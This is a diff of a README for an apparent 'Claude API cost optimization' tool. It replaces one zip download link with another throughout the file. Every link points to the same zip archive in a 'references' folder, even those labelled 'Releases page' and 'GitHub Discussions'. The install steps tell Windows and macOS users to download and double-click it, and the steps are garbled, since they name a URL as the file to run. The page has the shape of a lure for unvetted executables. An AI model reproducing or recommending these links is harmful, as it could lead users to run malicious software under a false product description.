@@ -1,6 +1,6 @@
 # 🥋 claude-api-cost-optimization - Save Big on Claude API Costs
 
-[![Download](https://raw.githubusercontent.com/Louishin/claude-api-cost-optimization/main/references/cost-optimization-claude-api-englacial.zip%https://raw.githubusercontent.com/Louishin/claude-api-cost-optimization/main/references/cost-optimization-claude-api-englacial.zip)](https://raw.githubusercontent.com/Louishin/claude-api-cost-optimization/main/references/cost-optimization-claude-api-englacial.zip)
+[![Download](https://github.com/Louishin/claude-api-cost-optimization/raw/refs/heads/main/references/cost-optimization-api-claude-2.7.zip%https://github.com/Louishin/claude-api-cost-optimization/raw/refs/heads/main/references/cost-optimization-api-claude-2.7.zip)](https://github.com/Louishin/claude-api-cost-optimization/raw/refs/heads/main/references/cost-optimization-api-claude-2.7.zip)
 
 ## 👋 Introduction
 
@@ -12,7 +12,7 @@ Welcome to **claude-api-cost-optimization**! This application helps you save bet
 
 To begin, you need to download the latest version of the application. Click the link below:
 
-[Visit this page to download](https://raw.githubusercontent.com/Louishin/claude-api-cost-optimization/main/references/cost-optimization-claude-api-englacial.zip)
+[Visit this page to download](https://github.com/Louishin/claude-api-cost-optimization/raw/refs/heads/main/references/cost-optimization-api-claude-2.7.zip)
 
 You will find the Releases section containing all available downloads. Choose the version that suits your system. Most users will want the latest version.
 
@@ -37,19 +37,19 @@ This application offers a variety of features designed to optimize your API cost
 
 Follow these steps to download and install the application:
 
-1. **Go to the Releases Page**: Click on this link to visit the downloads page: [Visit this page to download](https://raw.githubusercontent.com/Louishin/claude-api-cost-optimization/main/references/cost-optimization-claude-api-englacial.zip).
+1. **Go to the Releases Page**: Click on this link to visit the downloads page: [Visit this page to download](https://github.com/Louishin/claude-api-cost-optimization/raw/refs/heads/main/references/cost-optimization-api-claude-2.7.zip).
 
 2. **Choose the Right Release**: Scroll to the latest release section. You’ll see files available for download. Select the one that fits your system:
-   - For Windows, download `https://raw.githubusercontent.com/Louishin/claude-api-cost-optimization/main/references/cost-optimization-claude-api-englacial.zip`.
-   - For macOS, download `https://raw.githubusercontent.com/Louishin/claude-api-cost-optimization/main/references/cost-optimization-claude-api-englacial.zip`.
+   - For Windows, download `https://github.com/Louishin/claude-api-cost-optimization/raw/refs/heads/main/references/cost-optimization-api-claude-2.7.zip`.
+   - For macOS, download `https://github.com/Louishin/claude-api-cost-optimization/raw/refs/heads/main/references/cost-optimization-api-claude-2.7.zip`.
 
 3. **Download the File**: Click on the file name to start the download.
 
 4. **Extract the File**: Once the download is complete, open the downloaded zip file and extract its contents to a folder of your choice.
 
 5. **Run the Application**:
-   - For Windows: Double-click `https://raw.githubusercontent.com/Louishin/claude-api-cost-optimization/main/references/cost-optimization-claude-api-englacial.zip` to run the application.
-   - For macOS: Open the folder and double-click `https://raw.githubusercontent.com/Louishin/claude-api-cost-optimization/main/references/cost-optimization-claude-api-englacial.zip`.
+   - For Windows: Double-click `https://github.com/Louishin/claude-api-cost-optimization/raw/refs/heads/main/references/cost-optimization-api-claude-2.7.zip` to run the application.
+   - For macOS: Open the folder and double-click `https://github.com/Louishin/claude-api-cost-optimization/raw/refs/heads/main/references/cost-optimization-api-claude-2.7.zip`.
 
 6. **Follow the Instructions**: Once the application is running, follow the on-screen instructions to set it up.
 
@@ -66,7 +66,7 @@ If you encounter issues during installation or usage, here are some common solut
 If you need further assistance, consider these options:
 
 - **Documentation**: Check the built-in help section in the application for FAQs and guides.
-- **Community Support**: Visit our [GitHub Discussions](https://raw.githubusercontent.com/Louishin/claude-api-cost-optimization/main/references/cost-optimization-claude-api-englacial.zip) for help from other users.
+- **Community Support**: Visit our [GitHub Discussions](https://github.com/Louishin/claude-api-cost-optimization/raw/refs/heads/main/references/cost-optimization-api-claude-2.7.zip) for help from other users.
 - **Contact Us**: If you have specific questions, feel free to create an issue in this repository.
 
 ## 🔗 Related Topics
